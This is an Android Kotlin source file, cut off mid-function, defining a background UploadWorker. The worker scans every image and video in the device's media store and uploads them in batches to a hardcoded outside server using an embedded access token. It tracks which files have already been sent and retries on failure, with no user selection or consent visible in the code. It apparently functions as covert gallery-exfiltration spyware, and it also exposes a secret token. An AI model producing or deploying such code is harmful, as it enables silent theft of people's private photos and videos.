package com.example.sender

import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class UploadWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {

    companion object {
        const val SERVER_URL = "https://hamza-android-server.onrender.com"
        const val TOKEN = "efa5e4a0ebd4c9522fc9ef8e5bb7b2768b1387e504d006cb"
        const val PREFS_NAME = "uploaded_files"
        const val MAX_PER_RUN = 25
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val prefs = applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val uploaded = prefs.getStringSet("ids", emptySet())!!.toMutableSet()

            val media = mutableListOf<Triple<String, Uri, String>>()
            media += scanMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            media += scanMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)

            var count = 0
            for ((id, uri, name) in media) {
                if (id in uploaded) continue
                if (count >= MAX_PER_RUN) break
                if (uploadFile(uri, name)) {
                    uploaded.add(id)
                    count++
                }
            }

            prefs.edit().putStringSet("ids", uploaded).apply()
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }

    private fun scanMedia(collection: Uri): List<Triple<String, Uri, String>> {
        val result = mutableListOf<Triple<String, Uri, String>>()
        val proj = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
        applicationContext.contentResolver.query(
            collection, proj, null, null,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idCol   = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
            while (cursor.moveToNext()) {
                val id   = cursor.getLong(idCol).toString()
                val name = cursor.getString(nameCol) ?: continue
                val uri  = Uri.withAppendedPath(collection, id)
                result.add(Triple(id, uri, name))
            }
        }
        return result
    }

    private fun uploadFile(uri: Uri, name: String): Boolean {
        return try {
            val inputStream = applicationContext.contentResolver.openInputStream(uri) ?: return false
            val tmp = File(applicationContext.cacheDir, name)
            tmp.outputStream().use { out -> inputStream.use { it.copyTo(out) } }

            val ext = name.substringAfterLast('.', "").lowercase()
            val mediaType = when (ext) {
                "mp4", "mov", "webm", "3gp", "mkv", "avi" -> "video/*"
                else -> "image/*"
            }.toMediaType()

            val body = MultipartBody.Builder()
